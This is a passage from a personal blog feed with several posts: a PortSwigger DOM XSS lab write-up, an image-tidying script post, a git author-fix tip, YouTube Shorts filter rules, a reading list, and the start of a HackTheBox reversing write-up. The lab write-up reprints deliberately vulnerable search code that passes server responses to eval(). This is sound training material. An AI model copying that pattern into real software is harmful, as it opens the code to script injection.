You can check the lab out: <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected">here</a>
</p>

<blockquote>
<p>
This lab demonstrates a reflected DOM vulnerability. Reflected DOM
vulnerabilities occur when the server-side application processes data
from a request and echoes the data in the response. A script on the
page then processes the reflected data in an unsafe way, ultimately
writing it to a dangerous sink.
</p>
</blockquote>
</div>
<div id="outline-container-org5f2df52" class="outline-3">
<h3 id="org5f2df52"><span class="section-number-3">2.1.</span> <a href="#org5f2df52">Search functionality</a></h3>
<div class="outline-text-3" id="text-2-1">
<p>
First things first, checking out t
</p>

<div class="org-src-container">
<pre class="src src-html" id="org9f90e99">&lt;<span class="org-function-name">script</span> <span class="org-variable-name">src</span>=<span class="org-string">"/resources/js/searchResults.js"</span>&gt;&lt;/<span class="org-function-name">script</span>&gt;
&lt;<span class="org-function-name">script</span>&gt;search('search-results')&lt;/<span class="org-function-name">script</span>&gt;
</pre>
</div>
</div>
</div>
<div id="outline-container-orgb406efc" class="outline-3">
<h3 id="orgb406efc"><span class="section-number-3">2.2.</span> <a href="#orgb406efc">Analyzing the vulnerable JS snippet</a></h3>
<div class="outline-text-3" id="text-2-2">
<p>
Plainly: looking at <code>searchResults.js</code>
</p>

<div class="org-src-container">
<pre class="src src-js" id="org03be5b9"><span class="org-keyword">function</span> <span class="org-function-name">search</span>(<span class="org-variable-name">path</span>) {
    <span class="org-keyword">var</span> <span class="org-variable-name">xhr</span> = <span class="org-keyword">new</span> <span class="org-type">XMLHttpRequest</span>();
    xhr.onreadystatechange = <span class="org-keyword">function</span>() {
        <span class="org-keyword">if</span> (<span class="org-constant">this</span>.readyState == 4 &amp;&amp; <span class="org-constant">this</span>.status == 200) {
            eval(<span class="org-string">'var searchResultsObj = '</span> + <span class="org-constant">this</span>.responseText);
            displaySearchResults(searchResultsObj);
        }
    };
    xhr.open(<span class="org-string">"GET"</span>, path + window.location.search);
    xhr.send();

    <span class="org-keyword">function</span> <span class="org-function-name">displaySearchResults</span>(<span class="org-variable-name">searchResultsObj</span>) {
        <span class="org-keyword">var</span> <span class="org-variable-name">blogHeader</span> = document.getElementsByClassName(<span class="org-string">"blog-header"</span>)[0];
        <span class="org-keyword">var</span> <span class="org-variable-name">blogList</span> = document.getElementsByClassName(<span class="org-string">"blog-list"</span>)[0];
        <span class="org-keyword">var</span> <span class="org-variable-name">searchTerm</span> = searchResultsObj.searchTerm
        <span class="org-keyword">var</span> <span class="org-variable-name">searchResults</span> = searchResultsObj.results

        <span class="org-keyword">var</span> <span class="org-variable-name">h1</span> = document.createElement(<span class="org-string">"h1"</span>);
        h1.innerText = searchResults.length + <span class="org-string">" search results for '"</span> + searchTerm + <span class="org-string">"'"</span>;
        blogHeader.appendChild(h1);
        <span class="org-keyword">var</span> <span class="org-variable-name">hr</span> = document.createElement(<span class="org-string">"hr"</span>);
        blogHeader.appendChild(hr)

        <span class="org-keyword">for</span> (<span class="org-keyword">var</span> <span class="org-variable-name">i</span> = 0; i &lt; searchResults.length; ++i)
        {
            <span class="org-keyword">var</span> <span class="org-variable-name">searchResult</span> = searchResults[i];
            <span class="org-keyword">if</span> (searchResult.id) {
                <span class="org-keyword">var</span> <span class="org-variable-name">blogLink</span> = document.createElement(<span class="org-string">"a"</span>);
                blogLink.setAttribute(<span class="org-string">"href"</span>, <span class="org-string">"/post?postId="</span> + searchResult.id);

                <span class="org-keyword">if</span> (searchResult.headerImage) {
                    <span class="org-keyword">var</span> <span class="org-variable-name">headerImage</span> = document.createElement(<span class="org-string">"img"</span>);
                    headerImage.setAttribute(<span class="org-string">"src"</span>, <span class="org-string">"/image/"</span> + searchResult.headerImage);
                    blogLink.appendChild(headerImage);
                }

                blogList.appendChild(blogLink);
            }

            blogList.innerHTML += <span class="org-string">"&lt;br/&gt;"</span>;

            <span class="org-keyword">if</span> (searchResult.title) {
                <span class="org-keyword">var</span> <span class="org-variable-name">title</span> = document.createElement(<span class="org-string">"h2"</span>);
                title.innerText = searchResult.title;
                blogList.appendChild(title);
            }

            <span class="org-keyword">if</span> (searchResult.summary) {
                <span class="org-keyword">var</span> <span class="org-variable-name">summary</span> = document.createElement(<span class="org-string">"p"</span>);
                summary.innerText = searchResult.summary;
                blogList.appendChild(summary);
            }

            <span class="org-keyword">if</span> (searchResult.id) {
                <span class="org-keyword">var</span> <span class="org-variable-name">viewPostButton</span> = document.createElement(<span class="org-string">"a"</span>);
                viewPostButton.setAttribute(<span class="org-string">"class"</span>, <span class="org-string">"button is-small"</span>);
                viewPostButton.setAttribute(<span class="org-string">"href"</span>, <span class="org-string">"/post?postId="</span> + searchResult.id);
                viewPostButton.innerText = <span class="org-string">"View post"</span>;
            }
        }

        <span class="org-keyword">var</span> <span class="org-variable-name">linkback</span> = document.createElement(<span class="org-string">"div"</span>);
        linkback.setAttribute(<span class="org-string">"class"</span>, <span class="org-string">"is-linkback"</span>);
        <span class="org-keyword">var</span> <span class="org-variable-name">backToBlog</span> = document.createElement(<span class="org-string">"a"</span>);
        backToBlog.setAttribute(<span class="org-string">"href"</span>, <span class="org-string">"/"</span>);
        backToBlog.innerText = <span class="org-string">"Back to Blog"</span>;
        linkback.appendChild(backToBlog);
        blogList.appendChild(linkback);
    }
}
</pre>
</div>

<p>
The script, once <code>search(path)</code> is called evaluates the response that
came with our search request, as shown in the following picture:
</p>


<div id="orgf1abec9" class="figure">
<p><img src="posts/images/20240227_120813_screenshot.png" alt="20240227_120813_screenshot.png">
</p>
<p><span class="figure-number">Figure 1: </span>Search and Response</p>
</div>

<p>
Then the function <code>displaySearchResults()</code> is called, which taking the
information from <code>searchResultsObj</code> (what was returned), populates the
results page.
</p>

<p>
The <code>searchTerm</code> (our input) gets added in <code>h1.innerText</code>, while <b>for every</b>
<code>searchResult</code> the following process is followed:
</p>
<ol class="org-ol">
<li>If there is an <code>id</code> field:
<ol class="org-ol">
<li>Creates a ink element pointing to <code>"/post?postId=" + searchResult.id</code></li>
<li>If there is a <code>headerImage</code>
<ul class="org-ul">
<li>Adds an <code>img</code> with source: <code>"/image/" + searchResult.headerImage</code></li>
</ul></li>
</ol></li>
<li>If there is a <code>title</code> field:
<ul class="org-ul">
<li>Creates a <code>&lt;h2&gt;</code> element with <code>innerHTML</code></li>
</ul></li>
<li>If there is a <code>summary</code> field
<ul class="org-ul">
<li>Creates a <code>&lt;p&gt;</code> element with <code>innerHTML</code></li>
</ul></li>
<li>If there is a <code>id</code> field
<ul class="org-ul">
<li>Creates a <code>&lt;a&gt;</code>, &ldquo;View Post&rdquo; element: with a link similar to that
of the first <i>if</i></li>
</ul></li>
</ol>


<p>
Finally, some non-directly manipulatable actions insert <code>Back to Blog</code>
link.
</p>
</div>
</div>
<div id="outline-container-org297e808" class="outline-3">
<h3 id="org297e808"><span class="section-number-3">2.3.</span> <a href="#org297e808">Keep Going</a></h3>
<div class="outline-text-3" id="text-2-3">
<p>
Not going to lie, I felt stuck:
</p>
<ul class="org-ul">
<li><code>innerHTML</code> was tricky in the last lab as well and this time it was
made even trickier.</li>
<li>Angle brackets must be encoded: I had avoided that by setting
parameters, but now, writing inside of an <code>innerHTML</code> property, that
is not applicable</li>
<li><b>Taking a hint</b>: the <code>eval()</code> function when handling input</li>
</ul>
</div>
</div>
<div id="outline-container-org7104d90" class="outline-3">
<h3 id="org7104d90"><span class="section-number-3">2.4.</span> <a href="#org7104d90">Back</a></h3>
<div class="outline-text-3" id="text-2-4">
<p>
This is the vulnerable snippet:
</p>
<div class="org-src-container">
<pre class="src src-js" id="org7ce0f06"><span class="org-keyword">if</span> (<span class="org-constant">this</span>.readyState == 4 &amp;&amp; <span class="org-constant">this</span>.status == 200) {
    eval(<span class="org-string">'var searchResultsObj = '</span> + <span class="org-constant">this</span>.responseText);
    displaySearchResults(searchResultsObj);
}
</pre>
</div>


<p>
And our search query is included in that. After playing around in
repeater, I developed a payload that gave me promising results:
</p>


<div id="org9a4b157" class="figure">
<p><img src="posts/images/20240227_124012_screenshot.png" alt="20240227_124012_screenshot.png">
</p>
<p><span class="figure-number">Figure 2: </span>Promising Payload</p>
</div>

<p>
Using that very same payload in the search field and the lab is marked
as solved
</p>
</div>
</div>
</div>
<div id="outline-container-org1aaef3b" class="outline-2">
<h2 id="org1aaef3b"><span class="section-number-2">3.</span> <a href="#org1aaef3b">Summary</a></h2>
<div class="outline-text-2" id="text-3">
<p>
<b>DO NEVER OVERLOOK EVAL AGAIN, I KNEW BETTER THAN THAT</b>
</p>
</div>
</div>
]]>
</description></item>
<item>
<title>Tidying up the blog</title>
<link>posts/20240709_tidying_up_images.html</link>
<pubDate>Tue, 09 Jul 2024 13:57:00 +0300</pubDate>
<guid>posts/20240709_tidying_up_images.html</guid>
<description>
<![CDATA[<div id="outline-container-org437b581" class="outline-2">
<h2 id="org437b581"><span class="section-number-2">1.</span> <a href="#org437b581">Introduction</a></h2>
<div class="outline-text-2" id="text-1">
<p>
When I first started using <code>org-download</code> to have pictures within my
posts, I had not exactly configured it properly, resulting in numerous
subdirectories that I was not happy with:
</p>


<div id="orgfd87138" class="figure">
<p><img src="posts/images/Introduction/20240709_140235_screenshot.png" alt="20240709_140235_screenshot.png">
</p>
<p><span class="figure-number">Figure 1: </span>Look at all those image directories</p>
</div>

<p>
Moving on, I want that mess hidden within <code>images/</code>: The main directory
should be cleaner.
</p>

<div class="note" id="org3d321db">
<p>
TLDR: Even though this post started as a form of documentation to the
code I was writing, in order to tackle it quickly, I foolishly avoided
taking this kind of notes. This post, therefore, is rather
incomplete - I will fix it when I find myself in need to improve <code>morg</code>
:P.
</p>

</div>
</div>
</div>
<div id="outline-container-org57083f4" class="outline-2">
<h2 id="org57083f4"><span class="section-number-2">2.</span> <a href="#org57083f4">The plan</a></h2>
<div class="outline-text-2" id="text-2">
<p>
The plan here is to freshen up my python skills whilst creating a
script to:
</p>

<ol class="org-ol">
<li><b>Move <code>org</code> files and their related images to another directory</b> (this
is classic maintenance, avoiding to manually move my articles-turned-drafts)</li>
<li><b>Move a folder containing images inside of images/</b>, whilst updating
whatever links pointing to those images. If images with no links
are found they are printed for manual removal.</li>
</ol>
</div>
<div id="outline-container-orgd58c534" class="outline-3">
<h3 id="orgd58c534"><span class="section-number-3">2.1.</span> <a href="#orgd58c534">Subtasks</a></h3>
<div class="outline-text-3" id="text-2-1">
<p>
Covering the creation process of our tool, the article shows how to:
</p>
<ol class="org-ol">
<li>Develop a python function to check for links in org files pointing
to images</li>
<li>Develop a python function to modify the links while also moving the
directories inside the <code>images</code> dir</li>
<li>Develop a python function to check for broken links</li>
<li>Develop a python function to move an article to my draft subdir,
along with any photos it may have.</li>
</ol>
</div>
</div>
</div>
<div id="outline-container-orgd882b8e" class="outline-2">
<h2 id="orgd882b8e"><span class="section-number-2">3.</span> <a href="#orgd882b8e">Assumptions</a></h2>
<div class="outline-text-2" id="text-3">
<p>
Before we begin we need to make clear the constraints:
</p>
<ul class="org-ul">
<li>All <code>org</code> files exist in one directory. No need to recompute relative paths.</li>
<li>All image files are of <code>png</code> format. Minimal steps have been taken to
change that in the future if necessary.</li>
<li>My org files do not include paths to images outside of links.</li>
</ul>
</div>
</div>
<div id="outline-container-org6b87799" class="outline-2">
<h2 id="org6b87799"><span class="section-number-2">4.</span> <a href="#org6b87799">Step 0: Configuring the wrapper</a></h2>
<div class="outline-text-2" id="text-4">
<p>
I like using <code>argparse</code>, to easily add/remove options and manage them in
a significantly more secure and straightforward manner than if I
quickly made something from scratch.
</p>
</div>
</div>
<div id="outline-container-org946736a" class="outline-2">
<h2 id="org946736a"><span class="section-number-2">5.</span> <a href="#org946736a">Step 0.5: General Functions</a></h2>
<div class="outline-text-2" id="text-5">
<p>
At this point it is nice to develop some functions that will make the
rest of the code more readable, maintainable (and robust, avoiding the
same snippets to be used again and again).
</p>

<p>
In this &ldquo;project&rdquo;:
</p>
<ul class="org-ul">
<li>fileIsOrg / fileIsImage function</li>
<li>fileLinkRegex / imageLinkRegex</li>
</ul>
</div>
</div>
<div id="outline-container-orgede0918" class="outline-2">
<h2 id="orgede0918"><span class="section-number-2">6.</span> <a href="#orgede0918">Step 1: Link Checker</a></h2>
<div class="outline-text-2" id="text-6">
</div>
<div id="outline-container-org4b58ca7" class="outline-3">
<h3 id="org4b58ca7"><span class="section-number-3">6.1.</span> <a href="#org4b58ca7">Links in Files</a></h3>
<div class="outline-text-3" id="text-6-1">
<p>
Obviously, there are common parts in the functions described above.
The most apparent one is in <i>steps</i> 3 and 4: There needs to be a
function to:
a. Find (file) links
b. See where they point
</p>

<div class="note" id="orgb333928">
<p>
Image links are slightly different than general purpose org links.
Later in design, to avoid troubleshooting certain regex scenarios, I
also made a different function to search for image links only
</p>

</div>
</div>
</div>
</div>
<div id="outline-container-org3bf975b" class="outline-2">
<h2 id="org3bf975b"><span class="section-number-2">7.</span> <a href="#org3bf975b">Step 2: Move Images</a></h2>
<div class="outline-text-2" id="text-7">
</div>
<div id="outline-container-orgf814e68" class="outline-3">
<h3 id="orgf814e68"><span class="section-number-3">7.1.</span> <a href="#orgf814e68">The problem with moving images</a></h3>
<div class="outline-text-3" id="text-7-1">
<p>
It is not just a simple <code>mv</code>. It is a simple <code>mv</code> <b>along with</b> updating all
the org-files pointing to them: and not messing the paths up is what
makes it difficult 
</p>
</div>
</div>
</div>
<div id="outline-container-org8448cfe" class="outline-2">
<h2 id="org8448cfe"><span class="section-number-2">8.</span> <a href="#org8448cfe">And it is never so simple</a></h2>
<div class="outline-text-2" id="text-8">
<div class="tenor-gif-embed" data-postid="20462984" data-share-method="host" data-aspect-ratio="1.33333" data-width="100%"><a href="https://tenor.com/view/family-guy-peter-griffin-gif-20462984">Family Guy Peter Griffin GIF</a>from <a href="https://tenor.com/search/family+guy-gifs">Family Guy GIFs</a></div> <script type="text/javascript" async src="https://tenor.com/embed.js"></script>

<p>
Long story short, I am writing this 2 months after I finished the
<code>mimdir</code> functionality, effectively cleaning up the directory (as shown
in the image). I did not finish the script back there, nor did I
finish it now (though I also added the <code>corg</code> functionality). Hopefully
this article (and the related repo, as stated in the next section),
will be updated when I find the time in the future. I decided to
publish it in case anyone wanted the limited, already implemented,
functionality.
</p>


<div id="orgb9cc0be" class="figure">
<p><img src="posts/images/And_it_is_never_so_simple/20240902_121914_screenshot.png" alt="20240902_121914_screenshot.png">
</p>
<p><span class="figure-number">Figure 2: </span>After running morg</p>
</div>
</div>
</div>
<div id="outline-container-org75817e3" class="outline-2">
<h2 id="org75817e3"><span class="section-number-2">9.</span> <a href="#org75817e3">Summing Up and Criticizing</a></h2>
<div class="outline-text-2" id="text-9">
<p>
I have published this script in <a href="https://github.com/chatziiola/morg">chatziiola/morg</a>. If you want to use it
please refer to that version since mistakes are surely made and they
might have already been found.
</p>
</div>
<div id="outline-container-org5685fe6" class="outline-3">
<h3 id="org5685fe6"><span class="section-number-3">9.1.</span> <a href="#org5685fe6">Yet Another Note</a></h3>
<div class="outline-text-3" id="text-9-1">
<p>
There will come a time (maybe) when after spending some more time on
these that I will do an even better job, preferably fixing my
<code>org-download</code> configuration in a way that will render this relatively
useless, but till then, I am happy to just &ldquo;hide&rdquo; the clutter of
images inside an <code>images</code> directory.
</p>
</div>
</div>
</div>
]]>
</description></item>
<item>
<title>'Git'ting things done</title>
<link>posts/20250115_gitting_things_done.html</link>
<pubDate>Wed, 15 Jan 2025 19:33:00 +0200</pubDate>
<guid>posts/20250115_gitting_things_done.html</guid>
<description>
<![CDATA[<p>
After a long time, I&rsquo;m writing an article, and it sadly is not about
the things I&rsquo;m working on. This one is more like a note to anyone out
there finding themselves in this unfortunate position: having worked
on some projects over the holidays (alas, &ldquo;worked&rdquo; is an
understatement) and on a forcibly new installation, some files were
hastily rewritten/copied, so that I would not lose any time during the
transition. One critical such file was my <code>.gitconfig</code><sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>.
</p>
<div id="outline-container-orgc4813b9" class="outline-2">
<h2 id="orgc4813b9"><span class="section-number-2">1.</span> <a href="#orgc4813b9">Beware</a></h2>
<div class="outline-text-2" id="text-1">
<p>
Well, don&rsquo;t pay attention to the fanfare—just make sure to read your
details carefully, or you will find yourself in my position, as I did.
I hastily created a minimal <code>.gitconfig</code> and sailed on, working on my
projects and keeping my remotes up to date, until today, when I
noticed something off with my GitHub timeline<sup><a id="fnr.2" class="footref" href="#fn.2" role="doc-backlink">2</a></sup>.
</p>

<div class="org-src-container">
<pre class="src src-config" id="orgd381772">[user]
        name = &lt;your-name&gt;
        email = &lt;your-email&gt; ; make sure it really is your email
        username = &lt;your-username&gt; 

[init]
    ;; Instead of master, main is alright
        defaultBranch = main

[push]
    ;; Avoid setting upstream
    default = current

[checkout]
    ;; I mainly work with GitHub, like the consistency of it
    defaultRemote = gh

[core]
        editor = nvim
        whitespace = fix,-indent-with-non-tab,trailing-space,cr-at-eol
</pre>
</div>
</div>
</div>
<div id="outline-container-orge269ba1" class="outline-2">
<h2 id="orge269ba1"><span class="section-number-2">2.</span> <a href="#orge269ba1"><del>Identification, Evaluation, Solution</del>&#x2026; Amendment</a></h2>
<div class="outline-text-2" id="text-2">

<div id="org0bd328b" class="figure">
<p><img src="posts/images/20250115_195652_screenshot.png" alt="20250115_195652_screenshot.png">
</p>
<p><span class="figure-number">Figure 1: </span>Don&rsquo;t mind the current date, just see the empty ones around it</p>
</div>

<p>
My timeline was empty during arguably one of the busiest periods I had
this year—this could not be right! Heading to one random <code>repo</code>, I
verified that I was not crazy (at least, not that much): the commits
existed there. Strangely, not only did they exist, but their author
was listed as me—it was just that&#x2026; the account was not linked. I
immediately thought of my <code>.gitconfig</code>. Something had to be wrong there.
The files looked pretty identical (at least the critical parts)
between this and my working installation. In fact, the config command
<b>looked</b> the same.
</p>

<div class="org-src-container">
<pre class="src src-shell" id="org69925f7">git config -l
</pre>
</div>

<p>
But it was not. I had managed to write my email address incorrectly
and, as a result, <b>EVERY SINGLE COMMIT</b> I had made on my newest
installation had the wrong author details. Thankfully, it is easy to
solve, and all that is needed are <del>1</del>, <del>2</del>, and 3 commands.
</p>

<div class="org-src-container">
<pre class="src src-shell" id="org574845f"><span class="org-comment-delimiter"># </span><span class="org-comment">Find your last "proper" commit </span>
git log 
<span class="org-comment-delimiter"># </span><span class="org-comment">Fix faulty commits</span>
git rebase -r &lt;proper_commit_id&gt; --exec <span class="org-string">'git commit --amend --no-edit --reset-author'</span> 
<span class="org-comment-delimiter"># </span><span class="org-comment">Overwrite remote repo, necessary to my knowledge buuuut </span>
<span class="org-comment-delimiter"># </span><span class="org-comment">well, it will be more painful in shared repos,</span>
<span class="org-comment-delimiter"># </span><span class="org-comment">than it was in my personal ones. Check it first.</span>
git push -f 
</pre>
</div>

<p>
These will update <b>all</b> commits after the one specified so that they
have the proper author properties. There is just one funny catch:
since the second command does not &ldquo;modify&rdquo; the already existing
commits but, instead, creates new ones with the same contents, their
date gets shifted to the date that the <code>git rebase</code> command is executed.
This is how the last date in my screenshot is so brightly green&#x2026; I
borrowed something from my past self. ;)
</p>
</div>
</div>
<div id="footnotes">
<h2 class="footnotes">Footnotes: </h2>
<div id="text-footnotes">

<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
Which now exists on the much clearer <code>.config/git/config</code>, along with my default ignore file, but that is not the point. 
</p></div></div>

<div class="footdef"><sup><a id="fn.2" class="footnum" href="#fnr.2" role="doc-backlink">2</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
I do not even know how I noticed that.
</p></div></div>


</div>
</div>]]>
</description></item>
<item>
<title>Disabling YouTube Shorts: An easy way</title>
<link>posts/20251209_disabling-youtube-shorts.html</link>
<pubDate>Tue, 09 Dec 2025 23:50:00 +0200</pubDate>
<guid>posts/20251209_disabling-youtube-shorts.html</guid>
<description>
<![CDATA[<p>
I enjoy YouTube, but I find the &ldquo;shorts&rdquo; trend exhausting. It&rsquo;s easy to fall
into a time-wasting trap that leaves me feeling mentally drained. Being able to
filter them out would be the ideal solution, allowing me to use YouTube for what
I want without the distraction.
</p>
<div id="outline-container-org52f9085" class="outline-2">
<h2 id="org52f9085"><span class="section-number-2">1.</span> <a href="#org52f9085">The idea</a></h2>
<div class="outline-text-2" id="text-1">
<p>
Having played around with many different filtering systems over the years, both
on-device but also <i>site-wide</i>, with DNS sinkholes, I know how beneficial such a
change might be.
</p>

<p>
My go-to browser, Brave, comes with a <code>uBlock</code> compatible ad filtering mechanism.
I played around with it to block shorts, which resulted in a set of three rules
that fully (?) hide shorts from:
</p>
<ul class="org-ul">
<li>my homepage</li>
<li>the video pages (though I also use <a href="https://chromewebstore.google.com/detail/clean-youtube-hide-youtub/kalhfjomailhflienkfajocjodgjipie">Clean YouTube</a>)</li>
</ul>
<p>
And it (fully) blocks shorts, as in: I cannot go to <code>youtube.com/shorts</code>
</p>
</div>
</div>
<div id="outline-container-orge2db94f" class="outline-2">
<h2 id="orge2db94f"><span class="section-number-2">2.</span> <a href="#orge2db94f">The solution</a></h2>
<div class="outline-text-2" id="text-2">
<p>
To block YouTube shorts, you just need to add the following rules to your ad-blocker&rsquo;s custom filter list. In Brave, you can do this by navigating to <code>brave://settings/shields/filters</code> and adding the rules in the &ldquo;Create custom filters&rdquo; section.
</p>

<div class="org-src-container">
<pre class="src src-text">www.youtube.com/shorts/*
www.youtube.com##ytd-rich-shelf-renderer
www.youtube.com##ytd-reel-shelf-renderer
</pre>
</div>

<p>
This should work with uBlock Origin and other compatible ad-blockers as well.
</p>
</div>
</div>
]]>
</description></item>
<item>
<title>Reading List</title>
<link>posts/books.html</link>
<pubDate>Thu, 16 May 2024 12:17:00 +0300</pubDate>
<guid>posts/books.html</guid>
<description>
<![CDATA[<div id="outline-container-orgb1432e6" class="outline-2">
<h2 id="orgb1432e6"><span class="section-number-2">1.</span> <a href="#orgb1432e6">Introduction</a></h2>
<div class="outline-text-2" id="text-1">
<p>
Being an avid reader myself I always like it when I find trustworthy
sources (books, articles, websites) with lists of material to read. I
figured that my knack for losing the wonderful reading suggestions in
depths of oblivion (my zotero collection :P),and my confidence in that
I sometimes find stuff I would like my siblings and friends to read,
were good enough reasons for me to create a special page here, just
for that:
</p>

<p>
I have opted against tedious categorization: <code>ctrl+f</code> might be one&rsquo;s
best tool
</p>

<div class="note" id="orgbc465ce">
<p>
Every time I visit this page I can not help but feel a certain kind of
sadness, around the suggestions I have not made so far. There are much
more books and articles I would like there to be here, many of which
perhaps should have been the first to be placed here. The list will
never be adequately updated.
</p>

</div>
</div>
</div>
<div id="outline-container-orgdd9a531" class="outline-2">
<h2 id="orgdd9a531"><span class="section-number-2">2.</span> <a href="#orgdd9a531">Books you <span class="underline">have</span> to read</a></h2>
<div class="outline-text-2" id="text-2">
<p>
Creating a list like this feels somewhat pretentious and nearly impossible.  
No matter how hard I try, I can&rsquo;t seem to find an effective way to avoid  
omissions&#x2026;  
</p>
<ul class="org-ul">
<li>Patterson and Hennessy&rsquo;s computer organization and architecture books:  
<ul class="org-ul">
<li><a href="https://www.amazon.com/Computer-Architecture-Quantitative-Approach-Kaufmann-dp-0443154066/dp/0443154066/ref=dp_ob_title_bk">Computer Architecture: A Quantitative Approach</a></li>
<li><a href="https://www.amazon.com/Computer-Organization-Design-MIPS-Architecture/dp/0124077269">Computer Organization and Design</a></li>
</ul></li>
<li><a href="https://www.navalmanack.com/">Almanack of Naval Ravikant</a>: I&rsquo;m extremely grateful to Eric Jorgenson
for compiling this book. Lots of insights and ideas, beautifully
put together.</li>
<li><a href="https://www.stripe.press/poor-charlies-almanack">Poor Charlie&rsquo;s Almanack</a>: My fascination regarding Charlie Munger&rsquo;s
character is what prompted me to create this list in the first
place, and it is not randomness that is responsible for this book
being right after the <i>almanack</i> of Naval&#x2026; Instead of chain-reaction
I should call this one a lollapalooza effect.</li>
<li>J.R.R. Tolkien&rsquo;s Books:
<ul class="org-ul">
<li><a href="https://en.wikipedia.org/wiki/The_Children_of_H%C3%BArin">The Children of Húrin</a>: I consider this to be perhaps one of the
greatest fiction books I have ever read. Tremendously well
crafted.</li>
<li>The Lord of The Rings trilogy</li>
<li>The Silmarillion</li>
<li>The Hobbit</li>
</ul></li>
<li>The Count of Monte Cristo, by Alexandre Doumas</li>
<li>Factfulness, by Hans and Ola Rosling: Mind-boggling book. I would
put it next to Harari&rsquo;s &rsquo;Homo Deus&rsquo;, but much easier. Forces you to
reevaluate some ideas.</li>
<li>Surely You&rsquo;re Joking Mr. Feynman!,</li>
<li>Outliers: The Story of Success, by Malcolm Gladwell&#x2026; Found myself
suggesting that too often to friends to not include it here.</li>
</ul>
</div>
<div id="outline-container-org464ce40" class="outline-3">
<h3 id="org464ce40"><span class="section-number-3">2.1.</span> <a href="#org464ce40">Books I really liked</a></h3>
<div class="outline-text-3" id="text-2-1">
<ul class="org-ul">
<li>Bruce Schneier&rsquo;s Books:
<ul class="org-ul">
<li>Having added his blog in the next section, I realized that I had
not properly added his books here (at least the ones I have spent
some time studying):</li>
<li>Applied Cryptography</li>
<li>Liars and Outliers</li>
</ul></li>
<li>Menn&rsquo;s Cult Of the Dead Cow: There&rsquo;s something inspiring there,
though there is something in Menn&rsquo;s writing style that does not
resonate so well with me</li>
</ul>
</div>
</div>
</div>
<div id="outline-container-org4438365" class="outline-2">
<h2 id="org4438365"><span class="section-number-2">3.</span> <a href="#org4438365">Podcasts</a></h2>
<div class="outline-text-2" id="text-3">
<p>
In general, I am afraid of stating that I like a podcast because most
of them produce <b>so much content</b> that you cannot possibly listen to all
of it. Aaaaand&#x2026; if you are a <i>picky listener</i> like me, you only like
specific episodes, but you may be criticized for aligning with the
whole. I don&rsquo;t know&#x2026; we live in strange times indeed :P:
</p>
<ul class="org-ul">
<li>I have liked and repeatedly go back to some episodes in <a href="https://open.spotify.com/show/0XrOqvxlqQI6bmdYHuIVnr?si=881b759eaee547ad">Modern
Wisdom</a>. I think good work&rsquo;s been done there.</li>
</ul>
</div>
</div>
<div id="outline-container-org1219cce" class="outline-2">
<h2 id="org1219cce"><span class="section-number-2">4.</span> <a href="#org1219cce">Blogs / Articles</a></h2>
<div class="outline-text-2" id="text-4">
<ul class="org-ul">
<li><a href="https://two-wrongs.com/">https://two-wrongs.com/</a> I really like Chris&rsquo; blog, offering a unique
look on a plethora of different subjects. Pleasant, yet not always
relaxed, reading.</li>
<li><p>
<a href="https://www.schneier.com/">Crypto-Gram</a>: Schneier&rsquo;s influence can not be overstated,
and many of his are exceptionally mindblowing to me, mainly for 2
distinct reasons:
</p>
<ol class="org-ol">
<li>He either uses a completely different approach than the one I
have seen/thought of, allowing for increased understanding
through that perspective or</li>
<li>He states something that one might have come up with themselves
but more eloquently <b>also allowing</b> for new insight.</li>
</ol>
<p>
Thus, I can not help, but include it here.
</p>
<ul class="org-ul">
<li><a href="https://www.schneier.com/blog/archives/2024/06/rethinking-democracy-for-the-age-of-ai.html">Rethinking Democracy for the Age of AI</a></li>
</ul></li>
<li><a href="http://phrack.org">phrack</a>: Potentially the only http site here but&#x2026; One should read
at least some bits of it.</li>
<li><a href="https://notes.eatonphil.com/2024-09-23-be-someone-who-does-things.html?utm_source=danielmiessler.com&amp;utm_medium=newsletter&amp;utm_campaign=ul-no-452-the-new-hotness-notebooklm&amp;_bhlid=c3f7c26b97b3f0cb7aa94e9d1248603f2ed9ac09">Be Someone Who Does Things by Phil Eaton</a></li>
<li><a href="https://h0mbre.github.io/">https://h0mbre.github.io/</a>: Nice little blog - static for some time.</li>
</ul>
</div>
</div>
<div id="outline-container-org81fc9c0" class="outline-2">
<h2 id="org81fc9c0"><span class="section-number-2">5.</span> <a href="#org81fc9c0">Courses</a></h2>
<div class="outline-text-2" id="text-5">
<ul class="org-ul">
<li>Strang&rsquo;s Linear Algebra
<ul class="org-ul">
<li>This course might in fact have been the reason I started this
blog: Being so fascinated, I just kept taking notes in LaTeX and
building my workflow so that I could one day proud myself on not
only knowing the material covered but &#x2026;</li>
</ul></li>
<li>Thermodynamics lectures by Prof. David Miller
<ul class="org-ul">
<li><a href="https://www.youtube.com/playlist?list=PLZOZfX_TaWAH3zDurz4ds7jMFzhxhfKZV">https://www.youtube.com/playlist?list=PLZOZfX_TaWAH3zDurz4ds7jMFzhxhfKZV</a></li>
</ul></li>
</ul>
</div>
</div>
]]>
</description></item>
<item>
<title>HTB: Crypt Of The Undead</title>
<link>posts/htb_rev_crypt-of-the-undead.html</link>
<pubDate>Wed, 29 Jan 2025 00:00:00 +0200</pubDate>
<guid>posts/htb_rev_crypt-of-the-undead.html</guid>
<description>
<![CDATA[<div id="outline-container-orgd373e62" class="outline-2">
<h2 id="orgd373e62"><span class="section-number-2">1.</span> <a href="#orgd373e62">Introduction</a></h2>
<div class="outline-text-2" id="text-1">
<p>
Some days ago I published my <a href="posts/htb_rev_flagcasino.html">FlagCasino</a> writeup; Now that was a fun
reversing challenge, with a little bit of everything an amateur wants:
you can execute it, you can disassemble it, you can decompile it, it&rsquo;s
fun. This challenge was solved prior to that, and it is not that I did
not like it; I just did not like the ending :P
</p>
</div>
</div>
<div id="outline-container-org2264c98" class="outline-2">
<h2 id="org2264c98"><span class="section-number-2">2.</span> <a href="#org2264c98">Static Analysis</a></h2>
<div class="outline-text-2" id="text-2">
<p>
After running <code>i</code> (information) within <code>radare2</code>, <code>hexdump</code> on the <code>.undead</code>
flag file, We start with disassembly.
</p>

<p>
Getting a list of functions with <code>afl</code>.Interesting functions: 
</p>
<ul class="org-ul">
<li><code>encrypt_buf()</code></li>
<li><code>rename()</code></li>
<li><code>chacha20...</code> functions<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup></li>
<li>Lots of I/O functions</li>
</ul>
